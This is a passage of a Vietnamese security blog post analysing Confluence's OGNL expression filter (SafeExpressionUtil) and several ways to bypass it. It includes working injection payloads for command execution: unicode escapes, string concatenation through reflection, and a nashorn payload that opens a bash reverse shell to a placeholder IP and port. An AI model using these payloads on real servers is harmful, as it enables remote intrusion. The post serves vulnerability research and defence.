</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span><span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>isUnSafeClass</span><span style=color:#f92672>(</span>expression<span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>UNSAFE_EXPRESSIONS_CACHE</span><span style=color:#f92672>.</span><span style=color:#a6e22e>add</span><span style=color:#f92672>(</span>expression<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>SourceVersion<span style=color:#f92672>.</span><span style=color:#a6e22e>isName</span><span style=color:#f92672>(</span><span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>trimQuotes</span><span style=color:#f92672>(</span>expression<span style=color:#f92672>))</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>allowedClassNames</span><span style=color:#f92672>.</span><span style=color:#a6e22e>contains</span><span style=color:#f92672>(</span><span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>trimQuotes</span><span style=color:#f92672>(</span>expression<span style=color:#f92672>)))</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>SAFE_EXPRESSIONS_CACHE</span><span style=color:#f92672>.</span><span style=color:#a6e22e>add</span><span style=color:#f92672>(</span>expression<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                Object parsedExpression <span style=color:#f92672>=</span> OgnlUtil<span style=color:#f92672>.</span><span style=color:#a6e22e>compile</span><span style=color:#f92672>(</span>expression<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>parsedExpression <span style=color:#66d9ef>instanceof</span> Node<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span><span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>containsUnsafeExpression</span><span style=color:#f92672>((</span>Node<span style=color:#f92672>)</span>parsedExpression<span style=color:#f92672>,</span> visitedExpressions<span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>UNSAFE_EXPRESSIONS_CACHE</span><span style=color:#f92672>.</span><span style=color:#a6e22e>add</span><span style=color:#f92672>(</span>expression<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>                        log<span style=color:#f92672>.</span><span style=color:#a6e22e>debug</span><span style=color:#f92672>(</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>format</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Unsafe clause found in [\&#34; %s \&#34;]&#34;</span><span style=color:#f92672>,</span> expression<span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>                    <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>SAFE_EXPRESSIONS_CACHE</span><span style=color:#f92672>.</span><span style=color:#a6e22e>add</span><span style=color:#f92672>(</span>expression<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>                    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>                <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>RuntimeException <span style=color:#f92672>|</span> OgnlException var4<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>SAFE_EXPRESSIONS_CACHE</span><span style=color:#f92672>.</span><span style=color:#a6e22e>add</span><span style=color:#f92672>(</span>expression<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>                log<span style=color:#f92672>.</span><span style=color:#a6e22e>debug</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Cannot verify safety of OGNL expression&#34;</span><span style=color:#f92672>,</span> var4<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>SAFE_EXPRESSIONS_CACHE</span><span style=color:#f92672>.</span><span style=color:#a6e22e>contains</span><span style=color:#f92672>(</span>expression<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>Lần đầu dừng tại hàm này, OGNL expression của ta sẽ được đưa vào method <code>OgnlUtil.compile()</code> để parse, sau đó đưa vào method <code>this.containsUnsafeExpression()</code> để xử lí.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>// com/opensymphony/xwork/util/SafeExpressionUtil.class
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>boolean</span> <span style=color:#a6e22e>containsUnsafeExpression</span><span style=color:#f92672>(</span>Node node<span style=color:#f92672>,</span> Set<span style=color:#f92672>&lt;</span>String<span style=color:#f92672>&gt;</span> visitedExpressions<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    String nodeClassName <span style=color:#f92672>=</span> node<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>UNSAFE_NODE_TYPES<span style=color:#f92672>.</span><span style=color:#a6e22e>contains</span><span style=color:#f92672>(</span>nodeClassName<span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span><span style=color:#e6db74>&#34;ognl.ASTStaticMethod&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span>nodeClassName<span style=color:#f92672>)</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span><span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>allowedClassNames</span><span style=color:#f92672>.</span><span style=color:#a6e22e>contains</span><span style=color:#f92672>(</span>getClassNameFromStaticMethod<span style=color:#f92672>(</span>node<span style=color:#f92672>)))</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span><span style=color:#e6db74>&#34;ognl.ASTProperty&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span>nodeClassName<span style=color:#f92672>)</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>isUnSafeClass</span><span style=color:#f92672>(</span>node<span style=color:#f92672>.</span><span style=color:#a6e22e>toString</span><span style=color:#f92672>()))</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span><span style=color:#e6db74>&#34;ognl.ASTMethod&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span>nodeClassName<span style=color:#f92672>)</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>unsafeMethodNames</span><span style=color:#f92672>.</span><span style=color:#a6e22e>contains</span><span style=color:#f92672>(</span>getMethodInOgnlExp<span style=color:#f92672>(</span>node<span style=color:#f92672>)))</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span><span style=color:#e6db74>&#34;ognl.ASTVarRef&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span>nodeClassName<span style=color:#f92672>)</span> <span style=color:#f92672>&amp;&amp;</span> UNSAFE_VARIABLE_NAMES<span style=color:#f92672>.</span><span style=color:#a6e22e>contains</span><span style=color:#f92672>(</span>node<span style=color:#f92672>.</span><span style=color:#a6e22e>toString</span><span style=color:#f92672>()))</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span><span style=color:#e6db74>&#34;ognl.ASTConst&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span>nodeClassName<span style=color:#f92672>)</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span><span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>isSafeConstantExpressionNode</span><span style=color:#f92672>(</span>node<span style=color:#f92672>,</span> visitedExpressions<span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span><span style=color:#f92672>(</span><span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> 0<span style=color:#f92672>;</span> i <span style=color:#f92672>&lt;</span> node<span style=color:#f92672>.</span><span style=color:#a6e22e>jjtGetNumChildren</span><span style=color:#f92672>();</span> <span style=color:#f92672>++</span>i<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            Node childNode <span style=color:#f92672>=</span> node<span style=color:#f92672>.</span><span style=color:#a6e22e>jjtGetChild</span><span style=color:#f92672>(</span>i<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>childNode <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>containsUnsafeExpression</span><span style=color:#f92672>(</span>childNode<span style=color:#f92672>,</span> visitedExpressions<span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>Method này hoạt động bằng cách parse OGNL expression thành các AST node rồi lặp qua từng node để kiểm tra.
Những yếu tố mà thư viện XWork dựa vào để xác định expression an toàn hay không:</p><ul><li>Node type</li><li>Class name</li><li>Method name</li><li>Variable name</li></ul><p>Cụ thể các node, class, method và variable được xem là unsafe:</p><p><img loading=lazy src=https://i.imgur.com/sYFbC8i.png alt title=this.UNSAFE_NODE_TYPES></p><p><img loading=lazy src=https://i.imgur.com/C3XSJuA.png alt title=this.unsafePropertyNames></p><p><img loading=lazy src=https://i.imgur.com/nR4JMq8.png alt title=this.unsafeMethodNames></p><p><img loading=lazy src=https://i.imgur.com/ZDh83V4.png alt title=this.UNSAFE_VARIABLE_NAMES></p><p>và các class name được xem là safe tại property <code>allowedClassNames</code>:</p><p><img loading=lazy src=https://i.imgur.com/EcdGBLz.png alt></p><p>Method <code>this.isUnsafeClass()</code> có nhiệm vụ kiểm tra class name được sử dụng trong expression có nằm trong property <code>unsafePropertyNames</code> hay không.</p><p><img loading=lazy src=https://i.imgur.com/uORHKu9.png alt title=this.isUnsafeClass()></p><h3 id=payload-testing>Payload testing<a hidden class=anchor aria-hidden=true href=#payload-testing>#</a></h3><p>Đầu tiên, chúng ta xét payload đơn giản sau:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>${@java.lang.Runtime@getRuntime().exec(&#34;touch /tmp/pwned&#34;)}
</span></span></code></pre></div><p>Expression hiện tại của ta có dạng <code>ognl.ASTChain</code>.</p><p><img loading=lazy src=https://i.imgur.com/kJmU1ba.png alt></p><p>Sau đó lấy child node và tiếp tục parse.</p><p><img loading=lazy src=https://i.imgur.com/t7vI4ps.png alt></p><p>Hiện tại <code>nodeClassName</code> có giá trị <code>ognl.ASTStaticMethod</code> và không nằm trong <code>allowedClassNames</code> nên sẽ trả về true. Đồng nghĩa với việc payload của ta đã được xem là unsafe và sẽ không thực hiện payload nữa.</p><p><img loading=lazy src=https://i.imgur.com/hCw4xMV.png alt></p><h4 id=bypass-ways>Bypass ways<a hidden class=anchor aria-hidden=true href=#bypass-ways>#</a></h4><h5 id=unicode-escape>Unicode escape<a hidden class=anchor aria-hidden=true href=#unicode-escape>#</a></h5><p>Sử dụng các kí tự được unicode escaped (<code>\u0041</code> => <code>a</code>). Kĩ thuật này được anh Jang viết tại <a href=https://sec.vnpt.vn/2021/08/atlassian-confluence-pre-auth-rce-cve-2021-26084-va-cau-chuyen-ve-diem-mu-khi-tim-bug/>đây</a>.</p><p>Về cơ bản, trong quá trình xử lí OGNL, method <code>OgnlParserTokenManager.getNextToken()</code> sử dụng method <code>JavaCharStream.readChar()</code> có hỗ trợ xử lí chuỗi unicode escape nên chúng ta có thể lợi dụng điều này để vượt qua được bộ lọc.</p><h5 id=nối-chuỗi>Nối chuỗi<a hidden class=anchor aria-hidden=true href=#nối-chuỗi>#</a></h5><p>Ý tưởng được lấy từ blog của anh <a href=https://mr-r3bot.github.io/research/2022/06/06/Confluence-Preauth-RCE-2022.html>@mr_r3bot</a>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>${Class.forName(&#34;java.lang.&#34;+&#34;Runtime&#34;).getMethod(&#34;getRuntime&#34;,null).invoke(null,null).exec(&#34;touch /tmp/pwned&#34;)}}
</span></span></code></pre></div><p>Những thứ mà payload này sử dụng để vượt qua được các constraints:</p><ol><li>Sử dụng trực tiếp class <code>Class</code> thay vì các cách như: <code>java.lang.Class</code>, <code>''.class</code>, <code>''.getClass()</code>.</li><li>Tạo thành 2 chuỗi con và sử dụng nối chuỗi để ghép thành <code>java.lang.Runtime</code> ở giai đoạn runtime nhằm bypass method <code>this.isUnSafeClass()</code> trong đoạn xử lí đối với <code>ognl.ASTConst</code> vốn nằm ở giai đoạn pre-processing.<blockquote><p>Chúng ta có nhiều cách để đa dạng hóa payload ở bước này vì payload được thực hiện ở giai đoạn runtime. Tham khảo thêm tại <a href=https://pulsesecurity.co.nz/articles/EL-Injection-WAF-Bypass>đây</a>.</p></blockquote></li><li>Vì sử dụng kĩ thuật <a href=https://www.oracle.com/technical-resources/articles/java/javareflection.html>Reflection</a> để truy cập vào các method trong class <code>Runtime</code>, cộng với việc 2 method là <code>getMethod</code> và <code>invoke</code> không bị chặn nên ta có thể call được method <code>Runtime.exec()</code>.</li></ol><h5 id=sử-dụng-các-class-có-sẵn-và-không-bị-blacklist>Sử dụng các class có sẵn và không bị blacklist<a hidden class=anchor aria-hidden=true href=#sử-dụng-các-class-có-sẵn-và-không-bị-blacklist>#</a></h5><p>Payload này được lấy từ repo <a href="https://github.com/jbaines-r7/through_the_wire/blob/main/through_the_wire.py#L78=">jbaines-r7/through_the_wire</a>. Thông tin rằng đây là payload ban đầu mà nhóm APT-31 đã thực hiện tấn công khiến cho lỗ hổng 0-day của Confluence lúc này bị phát hiện và được biết đến rộng rãi như hiện tại.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>${Class.forName(&#34;com.opensymphony.webwork.ServletActionContext&#34;).getMethod(&#34;getResponse&#34;,null).invoke(null,null).setHeader(&#34;&#34;, Class.forName(&#34;javax.script.ScriptEngineManager&#34;).newInstance().getEngineByName(&#34;nashorn&#34;).eval(&#34;new java.lang.ProcessBuilder().command(&#39;bash&#39;,&#39;-c&#39;,&#39;bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1&#39;).start()&#34;))}
</span></span></code></pre></div><p>Payload này có nhiệm vụ chính là khởi tạo 1 <code>nashorn</code> instance (Javascript engine được tích hợp vào Java) và gọi đến <code>ProcessBuilder.command()</code> nhằm mục đích chạy payload để reverse shell.</p><p>Chúng ta có thể viết lại để payload này trả về kết quả tại giá trị trong header response như sau:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>${Class.forName(&#34;com.opensymphony.webwork.ServletActionContext&#34;).getMethod(&#34;getResponse&#34;,null).invoke(null,null).setHeader(&#34;Result&#34;,Class.forName(&#34;javax.script.ScriptEngineManager&#34;).newInstance().getEngineByName(&#34;nashorn&#34;).eval(&#34;res=&#39;&#39;;is=java.lang.Runtime.getRuntime().exec(&#39;id&#39;).getInputStream();while(is.available())res+=String.fromCharCode(is.read());res&#34;))}
</span></span></code></pre></div><p><img loading=lazy src=https://i.imgur.com/ihKqH7H.png alt></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://blog.undo.pw/tags/cve/>cve</a></li><li><a href=https://blog.undo.pw/tags/atlassian/>atlassian</a></li><li><a href=https://blog.undo.pw/tags/confluence/>confluence</a></li><li><a href=https://blog.undo.pw/tags/ognl/>ognl</a></li></ul><nav class=paginav><a class=prev href=https://blog.undo.pw/posts/cve-2022-2185-gitlab-bulk-import-project/><span class=title>« Prev</span><br><span>Gitlab Remote Code Execution via Bulk Import Import Project - CVE-2022-2185</span></a>
<a class=next href=https://blog.undo.pw/posts/ascis-2020-quals-web-short-writeup/><span class=title>Next »</span><br><span>ASCIS 2020 Quals - Web short writeup</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://blog.undo.pw/>blog.undo.pw</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>